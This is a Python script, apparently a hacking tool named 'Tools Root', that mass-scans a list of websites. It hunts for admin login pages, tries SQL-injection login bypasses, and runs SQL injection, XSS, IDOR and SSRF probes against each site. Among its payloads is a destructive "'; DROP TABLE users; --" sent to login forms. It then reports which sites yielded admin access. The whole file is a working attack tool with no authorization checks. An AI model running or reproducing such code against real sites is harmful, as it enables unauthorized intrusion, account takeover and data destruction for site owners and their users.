import requests
import os
import time
from colorama import Fore, Back, Style, init
from tqdm import tqdm
import pyfiglet
import pandas as pd

init(autoreset=True)

admin_paths = [
    "admin", "admin.php", "admin/login.php", "login", "administrator", "adminpanel",
    "admin_login", "cpanel", "dashboard", "admin_area", "admin_console", "manager", "admin.aspx"
]

# Check admin page availability
def find_admin_page(url):
    for path in admin_paths:
        admin_url = f"{url}/{path}"
        try:
            response = requests.get(admin_url, timeout=10)
            if response.status_code == 200 and "login" in response.text.lower():
                return admin_url
        except requests.exceptions.RequestException:
            continue
    return None

# Bypass admin panel with payloads
def bypass_admin_panel(admin_url):
    payloads = [
        {"username": "' OR 1=1 --", "password": "any"},
        {"username": "admin", "password": "' OR '1'='1"},
        {"username": "root", "password": "' UNION SELECT 1,2,3 --"},
        {"username": "admin", "password": "'; DROP TABLE users; --"},
    ]
    for payload in payloads:
        try:
            response = requests.post(admin_url, data=payload, timeout=10)
            if response.status_code == 200 and ("dashboard" in response.text.lower() or "welcome" in response.text.lower()):
                return {"path": admin_url, "username": payload["username"], "password": payload["password"]}
        except requests.exceptions.RequestException:
            continue
    return None

# Check for XSS vulnerabilities
def check_xss(url):
    payloads = ["<script>alert('XSS')</script>", "<img src='x' onerror='alert(1)'>"]
    results = []
    for payload in payloads:
        try:
            response = requests.get(f"{url}?q={payload}", timeout=10)
            if payload in response.text:
                results.append({"payload": payload, "path": f"{url}?q={payload}"})
        except requests.exceptions.RequestException:
            continue
    return results

# Check for SQL Injection vulnerabilities
def check_sql_injection(url):
    payloads = ["' OR 1=1 --", '" OR "a"="a', "' UNION SELECT NULL, NULL --"]
    results = []
    for payload in payloads:
        try:
            response = requests.get(f"{url}?id={payload}", timeout=10)
            if "syntax" in response.text.lower() or "mysql" in response.text.lower():
                results.append({"payload": payload, "path": f"{url}?id={payload}"})
        except requests.exceptions.RequestException:
            continue
    return results

# Check for IDOR vulnerabilities
def check_idor(url):
    user_ids = [1, 2, 3, 1000]
    results = []
    for user_id in user_ids:
        path = f"{url}/profile/{user_id}"
        try:
            response = requests.get(path, timeout=10)
            if response.status_code == 200 and "user" in response.text.lower():
                results.append({"payload": f"User ID: {user_id}", "path": path})
        except requests.exceptions.RequestException:
            continue
    return results

# Check for SSRF vulnerabilities
def check_ssrf(url):
    payload = "http://example.com"
    try:
        response = requests.get(f"{url}?url={payload}", timeout=10)
        if "example" in response.text.lower():
            return {"payload": payload, "path": f"{url}?url={payload}"}
    except requests.exceptions.RequestException:
        return None

# Display loading bar
def display_loading():
    print(Fore.WHITE + "Initializing the tool...")
    bar = tqdm(range(100), desc="Loading", ncols=100, bar_format="{l_bar}{bar}| {n_fmt}/{total_fmt}")
    for _ in bar:
        time.sleep(0.02)
    print(Fore.GREEN + "Tool initialized successfully!")

# Display welcome banner
def display_welcome():
    ascii_art = pyfiglet.figlet_format("Welcome to Tools Root", font="slant")
    print(Fore.GREEN + ascii_art)
    time.sleep(5)
    os.system('cls' if os.name == 'nt' else 'clear')

# Display program name
def display_program_name():
    ascii_art = pyfiglet.figlet_format("Tools Root", font="slant")
    print(Fore.LIGHTCYAN_EX + ascii_art)

# Scan sites for vulnerabilities
def scan_sites(filename):
    with open(filename, 'r') as file:
        sites = file.readlines()

    results = []

    for site in sites:
        site = site.strip()
        print(Fore.YELLOW + f"Scanning site: {site}")
        time.sleep(1)

        # Admin page detection
        admin_url = find_admin_page(site)
        if admin_url:
            print(Fore.GREEN + f"Admin page found: {admin_url}")
            bypass_result = bypass_admin_panel(admin_url)
            if bypass_result:
                results.append([site, "Admin Bypass", bypass_result["path"], bypass_result["username"], bypass_result["password"], "Detected"])
            else:
                results.append([site, "Admin Bypass", admin_url, "N/A", "N/A", "Not Detected"])

        # SQL Injection
        sql_results = check_sql_injection(site)
        for sql in sql_results:
            results.append([site, "SQL Injection", sql["path"], sql["payload"], "N/A", "Detected"])

        # XSS
        xss_results = check_xss(site)
        for xss in xss_results:
            results.append([site, "XSS", xss["path"], xss["payload"], "N/A", "Detected"])

        # IDOR
        idor_results = check_idor(site)
        for idor in idor_results:
            results.append([site, "IDOR", idor["path"], idor["payload"], "N/A", "Detected"])

        # SSRF
        ssrf_result = check_ssrf(site)
        if ssrf_result:
            results.append([site, "SSRF", ssrf_result["path"], ssrf_result["payload"], "N/A", "Detected"])

    # Display results in a table
    df = pd.DataFrame(results, columns=["Site", "Vulnerability", "Path", "Payload", "Username/Password", "Status"])
    print(Fore.WHITE + df.to_string(index=False))

def main():
    display_loading()
    display_welcome()
    filename = input(Fore.CYAN + "Enter the filename containing the list of websites (e.g., list.txt): ")

    if os.path.exists(filename):
        display_program_name()
        scan_sites(filename)
    else:
        print(Fore.RED + f"File '{filename}' not found! Please ensure the file is in the current directory.")

if __name__ == "__main__":
    main()
